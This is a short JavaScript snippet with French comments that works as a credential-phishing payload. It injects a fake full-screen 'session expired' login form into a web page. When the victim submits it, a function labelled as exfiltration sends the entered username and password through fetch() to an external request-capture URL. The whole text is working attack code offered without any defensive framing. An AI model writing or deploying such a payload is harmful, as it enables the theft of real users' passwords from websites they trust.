// Faux formulaire de session expirée
const div = document.createElement("div");
div.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;background:white;padding:20px;z-index:9999;">
    <h3>Votre session a expiré :</h3>
    <input id="user" placeholder="Identifiant">
    <input id="pass" placeholder="Mot de passe" type="password">
    <button onclick="steal()">Valider</button>
  </div>
`;
document.body.appendChild(div);

// Fonction d’exfiltration
function steal() {
  const u = document.getElementById('user').value;
  const p = document.getElementById('pass').value;
  fetch('https://01jtpa9tv1hahfj92dn7dbmxvp00-7695bb9a240c2e409fb7.requestinspector.com?user=' + encodeURIComponent(u) + '&pass=' + encodeURIComponent(p));
}
